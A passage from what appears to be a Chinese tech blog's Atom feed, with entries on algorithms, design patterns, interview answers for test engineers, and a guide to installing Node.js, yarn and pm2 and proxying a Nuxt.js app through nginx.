10; <br>x = x - y; 此时的y经上面的运算变成10，所以x = 30 - 10 = 20; 实现两个数的互换 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;两个数交换&quot;&gt;&lt;a href=&quot;#两个数交换&quot; class=&quot;headerlink&quot; title=&quot;两个数交换&quot;&gt;&lt;/a&gt;两个数交换&lt;/h2&gt;&lt;h3 id=&quot;1、借助中间量交换-（开发常用）&quot;&gt;&lt;a href=&quot;#1、借助中间量交换-（开发常用）&quot; class=&quot;</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="排序算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>算法-排序-计数</title>
    <link href="https://seniortesting.club/posts/FFyzaaM0VC/"/>
    <id>https://seniortesting.club/posts/FFyzaaM0VC/</id>
    <published>2021-03-25T15:23:52.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="排序算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>算法-排序-归并</title>
    <link href="https://seniortesting.club/posts/jtB1GiaODC/"/>
    <id>https://seniortesting.club/posts/jtB1GiaODC/</id>
    <published>2021-03-25T15:23:45.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="排序算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>设计模式系列(1) - 单例模式</title>
    <link href="https://seniortesting.club/posts/Gu6tlVURTA/"/>
    <id>https://seniortesting.club/posts/Gu6tlVURTA/</id>
    <published>2021-03-25T15:23:45.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://github.com/iluwatar/java-design-patterns" target="_blank" rel="noopener">GitHub整理Java设计模式</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考文档&quot;&gt;&lt;a href=&quot;#参考文档&quot; class=&quot;headerlink&quot; title=&quot;参考文档&quot;&gt;&lt;/a&gt;参考文档&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/iluwatar/java-design-pattern</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="设计模式系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="设计模式" scheme="https://seniortesting.club/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
    <category term="单例" scheme="https://seniortesting.club/tags/%E5%8D%95%E4%BE%8B/"/>
    
    <category term="单例模式" scheme="https://seniortesting.club/tags/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>redis相关知识整理</title>
    <link href="https://seniortesting.club/posts/pxrT76mSOi/"/>
    <id>https://seniortesting.club/posts/pxrT76mSOi/</id>
    <published>2021-03-25T15:22:40.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="中间件" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
    <category term="redis" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E4%B8%AD%E9%97%B4%E4%BB%B6/redis/"/>
    
    
  </entry>
  
  <entry>
    <title>如何有效管理一个测试团队</title>
    <link href="https://seniortesting.club/posts/CeVYVi9ch7/"/>
    <id>https://seniortesting.club/posts/CeVYVi9ch7/</id>
    <published>2021-03-25T15:21:59.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="面试-1-为什么从上一家公司离职"><a href="#面试-1-为什么从上一家公司离职" class="headerlink" title="[面试] 1. 为什么从上一家公司离职?"></a>[面试] 1. 为什么从上一家公司离职?</h2><ol><li>谈及想要更多的成长空间,比如说上家公司的工作比较轻松,但发展的空间不大,所以辞职了</li><li>说自己的职业发展路线与公司的发展规划不符,所以选择离职</li><li>说想要跳出自我的舒适区,去挑战更新的岗位或更新的环境,贵司的岗位介绍,我觉得特别适合,所以来应聘了</li></ol><h2 id="面试-2-为什么应聘这个岗位"><a href="#面试-2-为什么应聘这个岗位" class="headerlink" title="[面试] 2. 为什么应聘这个岗位"></a>[面试] 2. 为什么应聘这个岗位</h2><p>提前做好功课,面试前仔细阅读岗位要求和职责,回答时突出个人经验和技能与该岗位的匹配度相对比较高.</p><p>另外,回答时间可以提到招聘单位的规模,品牌,知名度,规范性,愿景等等.强调贵公司是适合个人职业发展的平台.</p><p>tips: 总之就是重点突出个人经验和技能与该应聘职位的匹配度.</p><h2 id="面试-3-你认为自己的缺点是什么"><a href="#面试-3-你认为自己的缺点是什么" class="headerlink" title="[面试] 3. 你认为自己的缺点是什么?"></a>[面试] 3. 你认为自己的缺点是什么?</h2><p>不要无脑地直接回答,而是避重就轻.(可从岗位要求里挑一两个反面的关键词,先说不好再补充自己在通过什么努力改正)</p><p>比如回答”以前对数据不够敏感,但后来总是到这个问题后,开始通过不断看和做数据在慢慢改善”</p><h2 id="面试-4-你的优点是什么"><a href="#面试-4-你的优点是什么" class="headerlink" title="[面试] 4. 你的优点是什么?"></a>[面试] 4. 你的优点是什么?</h2><p>列举出自己3-5个优点.(其实是列举目标岗位所作事情需要的优点, 最好附简单例子说明)</p><h2 id="面试-5-你在工作中遇到最大的困难是什么"><a href="#面试-5-你在工作中遇到最大的困难是什么" class="headerlink" title="[面试] 5. 你在工作中遇到最大的困难是什么?"></a>[面试] 5. 你在工作中遇到最大的困难是什么?</h2><p>做过什么,结果如何,遇到过什么困难,如何克服,举例子说,但不要讲没有把握的经历.</p><h2 id="面试-6-怎样看待加班"><a href="#面试-6-怎样看待加班" class="headerlink" title="[面试] 6. 怎样看待加班?"></a>[面试] 6. 怎样看待加班?</h2><p>不要一开口否决或带有成见,而是先从理解,再从为啥加班和如何避免加班上说明.</p><p>比如说: 如何一家单位都有可能要加班.如果任务没有完成,加班是理所当然,自己会提高工作效率.如果遇到紧急任务或突发情况时,需要加班,自己会尽己所能,帮助团队顺利完成任务.</p><h2 id="面试-7-你对我们公司了解多少"><a href="#面试-7-你对我们公司了解多少" class="headerlink" title="[面试] 7. 你对我们公司了解多少?"></a>[面试] 7. 你对我们公司了解多少?</h2><p>千万不要回答没了解过,说没了解过的基本会印象减分.即使不了解,也要说来之前上网查了贵公司经营业务,但具体业务可能还需要面试官你介绍一下.<br>最好面试前一晚做足功课,比如从百度,知乎,看准网,微博,微信公众号中多维度了解.(有app就提前下载)</p><h2 id="面试-8-你过去工作中自己觉得最有成就-印象最深的一件事"><a href="#面试-8-你过去工作中自己觉得最有成就-印象最深的一件事" class="headerlink" title="[面试] 8. 你过去工作中自己觉得最有成就/印象最深的一件事"></a>[面试] 8. 你过去工作中自己觉得最有成就/印象最深的一件事</h2><p>这个从好的方面说,比如在那份工作的那个阶段,通过XXX努力,和团队的配合,完成了什么项目,达到了什么效果,自己从中学到了什么,对自己的专业技能有什么影响等等.</p><p>Tips: 最好举例跟目标岗位匹配的技能和经历.</p><h2 id="面试-9-介绍未来3到5年职业规划-必考题"><a href="#面试-9-介绍未来3到5年职业规划-必考题" class="headerlink" title="[面试] 9. 介绍未来3到5年职业规划(必考题)"></a>[面试] 9. 介绍未来3到5年职业规划(必考题)</h2><ul><li><p>首先,介绍自己认真思考过这个问题,自己的规划是基于目前的实际情况来设计的.</p></li><li><p>其次,在工作方面,突出自己打算通过积极完成工作任务,积累各方面的经验,让自己成为这个领域的专业人士,也希望有机会能够带领团队,成为优秀的管理者,为单位做出更大贡献,获得双赢.</p></li><li><p>最后,在学习方面,打算在专业领域做进一步学习和研究,将实践经验与专业知识相结合,为自己的职业成长做好铺垫,打好基础.</p></li></ul><p>tips: 回答这个问题强调稳定性,踏实工作的态度,重点在工作技能方面的提升与内存积累.</p><h2 id="面试-10-你还有什么要问我的吗"><a href="#面试-10-你还有什么要问我的吗" class="headerlink" title="[面试] 10. 你还有什么要问我的吗?"></a>[面试] 10. 你还有什么要问我的吗?</h2><p>以下举例参考:</p><ol><li>团队,公司现在面临的最大挑战是什么?</li><li>对于未来加入这个团队,你对我的期望是什么?</li><li>这个部门人员设置是怎么样的.</li><li>您认为优秀的员工应该具备什么特质呢?</li><li>贵公司最让你自豪的企业文化是什么?</li></ol><p>tips: 回答面试官问题的时候,</p><ol><li>学着站在公司的角度去想法题</li><li>思考他们究竟想找一个什么样的候选人,把这个事情想明白就可以都可以从容面对呢.学会换位思考,他为什么要问我这个问题,其实是想<br>确认你是不是他们需要的人</li><li>万变不离其宗,从岗位职责和贵公司的业务情况去思考,然后在回答就会有思路多了.</li></ol><h2 id="面试-10"><a href="#面试-10" class="headerlink" title="[面试] 10"></a>[面试] 10</h2><h2 id="测试开发的定位"><a href="#测试开发的定位" class="headerlink" title="测试开发的定位"></a>测试开发的定位</h2><p>如果我们把产品的生产看成一个流水线的话，那么测试就是流水线上的一个重要岗位，把控着产品的质量。</p><p>当然，产品类型的不同，测试人员的能力不同，可做的事情也会有很大不同，比如是Web产品，那么我们会去做性能测试和Web UI自动化测试；比如是App产品，那么我们会去做专项测试和APP UI自动化测试，再比如是后端接口平台，那么我们会去做接口自动化测试。再比如游戏产品，测试方法和手段又不一样了。</p><p>在此过程中，如果你是一名新手，只能测试UI功能，那么定位为测试工程师；如果你可负责一些复杂业务的测试，并且可以做一些自动化工作，那么定位为中级测试工程师；如果你有丰富的测试经验，综合的测试技术，以及深入到产品内部去做类白盒的测试能力，那么定位为高级测试工程师。（注：这里只是一般的划分，不代表任何公司）</p><p><strong>大公司的测试开发与高级测试是并存的，测试开发只负责工具与平台的开发。</strong></p><p>测试开发不直接参于产品的测试工作。这其实也是与高级测试最大的不同之处。简单将测试开发工作总结为以下几个方面。</p><ol><li><p><strong>协助开发编写单元测试</strong>（并不是所有开发都一定会写单元测试），<strong>规范开发输出</strong>（比如输出一定标准接口文档）。</p></li><li><p>帮助功能测试人员提升技术能力，能够<strong>独立完成自动化测试工作</strong>。</p></li><li><p><strong>开发测试平台</strong>：比如，性能测试平台，帮助开发测试进行性能测试。开发接口测试平台，管理与维护接口平台，开发自动化测试平台，方便管理与维护自动化测试。</p></li><li><p><strong>挖掘测试需求，通过技术手段帮助测试团队提升测试效率</strong>。</p></li></ol><p>总结下来，<strong>就是测试的经验，开发的能力，干着服务于开发与测试的工作</strong>。</p><p>最后，测试开发并不是高级测试的下一阶段，只职责不同而已。以上仅个人看法！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;面试-1-为什么从上一家公司离职&quot;&gt;&lt;a href=&quot;#面试-1-为什么从上一家公司离职&quot; class=&quot;headerlink&quot; title=&quot;[面试] 1. 为什么从上一家公司离职?&quot;&gt;&lt;/a&gt;[面试] 1. 为什么从上一家公司离职?&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="职业发展" scheme="https://seniortesting.club/categories/%E8%81%8C%E4%B8%9A%E5%8F%91%E5%B1%95/"/>
    
    <category term="项目管理" scheme="https://seniortesting.club/categories/%E8%81%8C%E4%B8%9A%E5%8F%91%E5%B1%95/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"/>
    
    
    <category term="面试" scheme="https://seniortesting.club/tags/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="项目管理" scheme="https://seniortesting.club/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"/>
    
    <category term="测试开发" scheme="https://seniortesting.club/tags/%E6%B5%8B%E8%AF%95%E5%BC%80%E5%8F%91/"/>
    
    <category term="高级测试" scheme="https://seniortesting.club/tags/%E9%AB%98%E7%BA%A7%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="性能测试" scheme="https://seniortesting.club/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"/>
    
    <category term="接口测试" scheme="https://seniortesting.club/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>算法系列(2) - 最长子序列解析和思考</title>
    <link href="https://seniortesting.club/posts/jwrUImyK8w/"/>
    <id>https://seniortesting.club/posts/jwrUImyK8w/</id>
    <published>2021-03-25T15:21:06.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="动态规划" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    
    <category term="面试" scheme="https://seniortesting.club/tags/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="算法" scheme="https://seniortesting.club/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="算法系列" scheme="https://seniortesting.club/tags/%E7%AE%97%E6%B3%95%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>算法系列(1) - 背包问题分析和思考</title>
    <link href="https://seniortesting.club/posts/TVjeFwTTDp/"/>
    <id>https://seniortesting.club/posts/TVjeFwTTDp/</id>
    <published>2021-03-25T15:19:32.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    <category term="动态规划" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    
    <category term="面试" scheme="https://seniortesting.club/tags/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="算法" scheme="https://seniortesting.club/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="算法系列" scheme="https://seniortesting.club/tags/%E7%AE%97%E6%B3%95%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>flask技巧和问题整理</title>
    <link href="https://seniortesting.club/posts/pS1WSm79uW/"/>
    <id>https://seniortesting.club/posts/pS1WSm79uW/</id>
    <published>2021-03-25T15:17:41.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="Flask" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/Flask/"/>
    
    
  </entry>
  
  <entry>
    <title>fastapi入门介绍</title>
    <link href="https://seniortesting.club/posts/M2pcfiW7HO/"/>
    <id>https://seniortesting.club/posts/M2pcfiW7HO/</id>
    <published>2021-03-25T15:17:20.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="Fastapi" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/Fastapi/"/>
    
    
  </entry>
  
  <entry>
    <title>Vue nuxtjs安装及其环境配置</title>
    <link href="https://seniortesting.club/posts/1fMHgAoKSp/"/>
    <id>https://seniortesting.club/posts/1fMHgAoKSp/</id>
    <published>2021-03-25T15:16:52.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nodejs环境配置"><a href="#nodejs环境配置" class="headerlink" title="nodejs环境配置"></a>nodejs环境配置</h2><ul><li>下载<code>node</code>,并执行命令安装node配置<code>PATH</code>路径:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;cpuinfo </span><br><span class="line">Processor       : ARMv7 Processor rev 10 (v7l)</span><br><span class="line">ARMv7 (and below) is 32-bit. ARMv8 introduces the 64-bit instruction set.</span><br><span class="line">If you want to see whether your system supports 64-bit binaries, check the kernel architecture:</span><br><span class="line">$ uname -m</span><br><span class="line">此处树莓派4是ARMv7架构</span><br><span class="line"></span><br><span class="line">$ 树莓派: wget https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v12.14.1&#x2F;node-v12.14.1-linux-armv7l.tar.xz</span><br><span class="line">$ linux64位架构: wget https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v12.14.1&#x2F;node-v12.14.1-linux-x64.tar.xz</span><br><span class="line">$ tar xvf node-v12.14.1-linux-armv7l.tar.xz</span><br><span class="line">$ tar xvf node-v12.14.1-linux-x64.tar.xz</span><br><span class="line">$ mv node-v12.14.1-linux-armv7l &#x2F;opt&#x2F;</span><br><span class="line">$ sudo nano &#x2F;etc&#x2F;profile</span><br><span class="line">增加对应的node的PATH路径,例如如下:</span><br><span class="line">export PATH&#x3D;&#x2F;opt&#x2F;node-v12.14.1-linux-armv7l&#x2F;bin:$PATH</span><br><span class="line">export PATH&#x3D;&#x2F;opt&#x2F;node-v12.14.1-linux-x64&#x2F;bin:$PATH</span><br><span class="line">执行如下命令使上面的PATH配置生效</span><br><span class="line">$ source &#x2F;etc&#x2F;profile </span><br><span class="line"></span><br><span class="line">执行如下命令确认node环境变量配置成功</span><br><span class="line">$ node -v</span><br><span class="line">$ npm -v </span><br><span class="line"></span><br><span class="line">设置npm和yarn的镜像为淘宝镜像</span><br><span class="line">$ npm config set prefix E:\nodejs\node_global</span><br><span class="line">$ npm config set cache E:\nodejs\node_cache</span><br><span class="line">$ npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br><span class="line">$ npm config list</span><br></pre></td></tr></table></figure><ul><li>安装node的包管理器<code>yarn</code>(当然此处也可以不安装,直接使用node内置的<code>npm</code>来管理包):</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i yarn -g</span><br><span class="line">yarn config set registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure><ul><li>安装<code>pm2</code>命令用于后台服务静默执行:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ npm i pm2 -g</span><br><span class="line"></span><br><span class="line">配置pm2开机启动脚本</span><br><span class="line">$ pm2 startup </span><br></pre></td></tr></table></figure><h2 id="1-测试环境运行调试"><a href="#1-测试环境运行调试" class="headerlink" title="1. 测试环境运行调试"></a>1. 测试环境运行调试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install dependencies</span></span><br><span class="line">$ yarn install</span><br><span class="line"></span><br><span class="line"><span class="comment"># serve with hot reload at localhost:3000</span></span><br><span class="line">$ yarn dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># build for production and launch server</span></span><br><span class="line">$ yarn build</span><br><span class="line">$ yarn start</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate static project</span></span><br><span class="line">$ yarn generate</span><br></pre></td></tr></table></figure><h2 id="2-生产环境项目部署"><a href="#2-生产环境项目部署" class="headerlink" title="2. 生产环境项目部署"></a>2. 生产环境项目部署</h2><ul><li>复制当前所有包文件,解压,然后在当前文件夹下执行命令安装编译工程:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ yarn </span><br><span class="line">$ yarn build</span><br><span class="line"></span><br><span class="line">编译程序, 然后配置pm2程序</span><br><span class="line">$ pm2 start  ecosystem.config.js --watch</span><br><span class="line">$ pm2 save</span><br></pre></td></tr></table></figure><h2 id="3-重新发布-新版发布"><a href="#3-重新发布-新版发布" class="headerlink" title="3. 重新发布/新版发布"></a>3. 重新发布/新版发布</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 首先复制源码目录文件到对应的服务器,然后直接如下命令:</span><br><span class="line">$ yarn build</span><br><span class="line">$ pm2 reload name| all</span><br><span class="line">$ pm2 restart all</span><br><span class="line">$ pm2 logs</span><br><span class="line">$ pm2 delete all</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>执行pm2相关命令确认程序启动没有问题:</li></ul><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pm2 list    # 查看所有的pm2程序</span><br><span class="line">pm2 monit   # 查看pm2的所有程序的监控面板</span><br><span class="line">pm2 reload</span><br></pre></td></tr></table></figure><p>如果上述配置都没有问题,可以访问地址: <code>http://127.0.0.0:3000</code>查看启动程序,然后我们只需要在nginx配置<br>将所有请求反转到<code>nginx</code>,参考配置如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># proxy for  project</span><br><span class="line">location  &#x2F; &#123; </span><br><span class="line">        alias   &#x2F;www&#x2F;the project folder&#x2F;;</span><br><span class="line">        proxy_pass http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         proxy_http_version      1.1;</span><br><span class="line">         proxy_cache_bypass      $http_upgrade;</span><br><span class="line"></span><br><span class="line">         proxy_set_header Upgrade                        $http_upgrade;</span><br><span class="line">         proxy_set_header Connection             &quot;upgrade&quot;;</span><br><span class="line">         proxy_set_header Host                           $host;</span><br><span class="line">         proxy_set_header X-Real-IP                      $remote_addr;</span><br><span class="line">         proxy_set_header X-Forwarded-For        $proxy_add_x_forwarded_for;</span><br><span class="line">         proxy_set_header X-Forwarded-Proto      $scheme;</span><br><span class="line">         proxy_set_header X-Forwarded-Host       $host;</span><br><span class="line">         proxy_set_header X-Forwarded-Port       $server_port;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-发布到npmjs-com中使用jsDelivr-CDN加速"><a href="#4-发布到npmjs-com中使用jsDelivr-CDN加速" class="headerlink" title="4. 发布到npmjs.com中使用jsDelivr CDN加速"></a>4. 发布到npmjs.com中使用jsDelivr CDN加速</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> npm login --registry=https://registry.npmjs.com/</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> npm publish --registry=https://registry.npmjs.com/</span></span><br></pre></td></tr></table></figure><hr><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="安装node-sass-报错"><a href="#安装node-sass-报错" class="headerlink" title="安装node-sass 报错"></a>安装<code>node-sass</code> 报错</h2><p>首先要知道的是，安装<code>node-sass</code>时在<code>node scripts/install</code>阶段会从 github.com 上下载一个.node文件，大部分安装不成功的原因都源自这里，因为 GitHub Releases 里的文件都托管在<code>s3.amazonaws.com</code>上面，而这个网址在国内总是_网络不稳定_，所以我们需要通过第三方服务器下载这个文件。（顺带一提，你可以看看<a 